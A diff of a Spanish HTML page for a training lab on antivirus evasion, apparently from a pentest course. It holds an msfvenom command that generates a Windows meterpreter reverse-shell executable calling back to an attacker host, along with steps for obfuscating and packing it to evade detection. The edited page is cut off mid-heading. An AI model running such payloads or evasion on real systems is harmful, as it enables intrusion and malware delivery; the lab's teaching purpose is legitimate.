@@ -1,50 +1,132 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Lab 24 – Evasión de antivirus mediante ofuscación de payloads y técnicas de empaquetado</title>
-  <link rel="icon" href="/el-pergamino-digital/assets/favicon.png" type="image/png" />
-  <style>
-  :root { color-scheme: dark; }
-  body {
-    font-family: 'Segoe UI', sans-serif;
-    background-color: #121212;
-    color: #e0e0e0;
-    margin: 0;
-    padding: 2em;
-    line-height: 1.6;
-  }
-  h1, h2 {
-    color: #90caf9;
-  }
-  code {
-    background-color: #1e1e1e;
-    padding: 0.2em 0.4em;
-    border-radius: 4px;
-    font-family: Consolas, monospace;
-  }
-  pre {
-    background-color: #1e1e1e;
-    padding: 1em;
-    border-radius: 6px;
-    overflow-x: auto;
-  }
-  a {
-    color: #90caf9;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lab 24 – Evasión de antivirus mediante ofuscación de payloads</title>
 
+  <style>
+    :root { color-scheme: dark; }
+
+    body {
+      font-family: "Segoe UI", system-ui, sans-serif;
+      background-color: #121212;
+      color: #e0e0e0;
+      margin: 0;
+      padding: 0;
+      line-height: 1.6;
+    }
+
+    nav {
+      background-color: #1f1f1f;
+      padding: 1em;
+      text-align: center;
+    }
+
+    nav a {
+      color: #e0e0e0;
+      margin: 0 1em;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    nav a:hover {
+      text-decoration: underline;
+    }
+
+    h1 {
+      text-align: center;
+      margin-top: 1.5em;
+      color: #ffffff;
+    }
+
+    .subtitulo {
+      text-align: center;
+      color: #bbbbbb;
+      margin-bottom: 2em;
+      font-size: 1.1em;
+    }
+
+    main {
+      max-width: 900px;
+      margin: auto;
+      padding: 2em;
+    }
+
+    section {
+      margin-bottom: 2.5em;
+    }
+
+    h2 {
+      color: #90caf9;
+      border-bottom: 1px solid #2a2a2a;
+      padding-bottom: 0.3em;
+    }
+
+    ul, ol {
+      padding-left: 1.5em;
+    }
+
+    code {
+      background-color: #1e1e1e;
+      padding: 0.2em 0.4em;
+      border-radius: 4px;
+      font-family: Consolas, monospace;
+      font-size: 0.95em;
+    }
+
+    pre {
+      background-color: #1e1e1e;
+      padding: 1em;
+      border-radius: 6px;
+      overflow-x: auto;
+      margin-top: 0.5em;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2em;
+      background-color: #1e1e1e;
+      font-size: 0.9em;
+      color: #aaaaaa;
+      margin-top: 3em;
+    }
+
+    a {
+      color: #90caf9;
+    }
+
+    @media (max-width: 600px) {
+      body { font-size: 1.05em; }
+      nav a { display: block; margin: 0.5em 0; }
+    }
+  </style>
 </head>
 
 <body>
 
-<h1>Lab 24 – Evasión de antivirus mediante ofuscación de payloads y técnicas de empaquetado</h1>
-<p class="subtitulo">Transformación de binarios maliciosos para evitar detección por motores antivirus tradicionales</p>
+<nav>
+  <a href="../../index.html">Inicio</a>
+  <a href="../index.html">Laboratorios</a>
+  <a href="../../glosario.html">Glosario</a>
+  <a href="../../simulador.html">Simulador</a>
+  <a href="../../modulos.html">Módulos</a>
+</nav>
+
+<h1>Lab 24 – Evasión de antivirus mediante ofuscación de payloads</h1>
+<p class="subtitulo">
+  Transformación de binarios para evadir detección por motores antivirus
+</p>
+
+<main>
 
 <section>
   <h2>Objetivo</h2>
-  <p>Comprender cómo los motores antivirus detectan amenazas y cómo pueden ser evadidos mediante técnicas de ofuscación, cifrado y empaquetado, evaluando la eficacia defensiva basada en firmas y comportamiento.</p>
+  <p>
+    Analizar cómo los motores antivirus detectan amenazas y cómo pueden ser evadidos
+    mediante técnicas de ofuscación, cifrado y empaquetado, sin alterar la funcionalidad
+    del payload.
+  </p>
 </section>
 
 <section>
@@ -56,150 +138,61 @@
   <h2>Herramientas utilizadas</h2>
   <ul>
     <li>msfvenom</li>
-    <li>Veil</li>
+    <li>Veil Framework</li>
     <li>Shellter</li>
     <li>PEStudio</li>
-    <li>VirusTotal (solo análisis teórico)</li>
+    <li>VirusTotal (solo análisis controlado)</li>
   </ul>
 </section>
 
 <section>
   <h2>Entorno de laboratorio</h2>
-  <p>Kali Linux como atacante, Windows con antivirus activo como víctima, red virtual aislada y snapshots de restauración.</p>
+  <p>
+    Kali Linux como atacante, Windows con antivirus activo como víctima,
+    red virtual aislada y snapshots habilitados.
+  </p>
 </section>
 
 <section>
   <h2>Escenario</h2>
-  <p>Un analista ofensivo necesita ejecutar un payload en un sistema protegido por antivirus, evaluando técnicas para evadir la detección sin modificar la funcionalidad.</p>
+  <p>
+    El analista ofensivo necesita ejecutar un payload en un sistema protegido
+    por antivirus, evaluando qué técnicas permiten evadir la detección.
+  </p>
 </section>
 
 <section>
-  <h2>Pasos previos</h2>
-  <ul>
-    <li>Generar payload base con msfvenom</li>
-    <li>Confirmar detección inicial por antivirus</li>
-    <li>Instalar Veil y Shellter</li>
-    <li>Preparar entorno de análisis estático</li>
-  </ul>
-</section>
+  <h2>Desarrollo técnico</h2>
 
-<section>
-  <h2>Desarrollo</h2>
-  <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe</code></pre>
-  <p>Aplicar ofuscación, empaquetado y comparar resultados antes y después.</p>
+  <pre><code>
+msfvenom -p windows/meterpreter/reverse_tcp \
+LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
+  </code></pre>
+
+  <p>
+    El binario generado se analiza, se ofusca y se empaqueta para comparar
+    el comportamiento del antivirus antes y después.
+  </p>
 </section>
 
 <section>
   <h2>Resultados esperados</h2>
   <ul>
-    <li>Payload original detectado</li>
-    <li>Payload ofuscado con menor detección</li>
-    <li>Ejecución funcional tras evasión</li>
-  </ul>
-</section>
-
-<section>
-  <h2>Análisis de resultados</h2>
-  <p>Las modificaciones estructurales del binario alteran las firmas estáticas, reduciendo la efectividad de detección tradicional.</p>
-</section>
-
-<section>
-  <h2>Conclusiones</h2>
-  <p>La evasión de antivirus es viable, pero refuerza la necesidad de defensas basadas en comportamiento y análisis dinámico.</p>
-</section>
-
-<section>
-  <h2>Medidas</h2>
-  <ul>
-    <li>Documentar hashes y firmas</li>
-    <li>Comparar detección antes y después</li>
-    <li>Registrar parámetros utilizados</li>
+    <li>Detección del payload original</li>
+    <li>Reducción de detección tras ofuscación</li>
+    <li>Ejecución exitosa del payload modificado</li>
   </ul>
 </section>
 
 <section>
   <h2>Contramedidas</h2>
   <ul>
-    <li>Sandboxing</li>
-    <li>Análisis heurístico</li>
+    <li>Detección basada en comportamiento</li>
+    <li>Sandboxing y análisis dinámico</li>
     <li>Correlación en SIEM</li>
   </ul>
 </section>
 
 <section>
-  <h2>Riesgos y advertencias</h2>
-  <p>Ejecutar únicamente en entornos controlados. No usar payloads reales en sistemas productivos.</p>
-</section>
+  <h2>Validación
 
-<section>
-  <h2>Evidencias</h2>
-  <p>Espacio reservado para capturas, logs y análisis.</p>
-</section>
-
-<section>
-  <h2>Validación cruzada</h2>
-  <ul>
-    <li>MITRE ATT&CK T1027</li>
-    <li>CIS Control 10</li>
-    <li>NIST SP 800-83</li>
-  </ul>
-</section>
-
-<section>
-  <h2>Glosario asociado</h2>
-  <ul>
-    <li>Ofuscación</li>
-    <li>Empaquetado</li>
-    <li>Sandbox</li>
-    <li>Payload</li>
-  </ul>
-</section>
-
-<section>
-  <h2>Preguntas de refuerzo</h2>
-  <ul>
-    <li>Diferencia entre firma y comportamiento</li>
-    <li>Riesgos de VirusTotal</li>
-    <li>Ventajas del sandbox</li>
-  </ul>
-</section>
-
-<section>
-  <h2>Rúbrica de evaluación</h2>
-  <ul>
-    <li>Ejecución correcta</li>
-    <li>Análisis técnico</li>
-    <li>Aplicación de contramedidas</li>
-  </ul>
-</section>
-
-<section>
-  <h2>Recursos complementarios</h2>
-  <ul>
-    <li>Veil Framework</li>
-    <li>Shellter</li>
-    <li>PEStudio</li>
-  </ul>
-</section>
-
-<section>
-  <h2>Créditos y licencia</h2>
-  <p>Proyecto El Pergamino Digital – CC BY-NC-SA 4.0</p>
-</section>
-
-<section>
-  <h2>Nivel de certificación</h2>
-  <p>Avanzado – OSCP / eCPTXv2</p>
-</section>
-
-<section>
-  <h2>Mapa de integración</h2>
-  <ul>
-    <li>Continúa Lab 23</li>
-    <li>Refuerza evasión en endpoint</li>
-    <li>Integra simulador certificador</li>
-  </ul>
-</section>
-
-</body>
-</html>
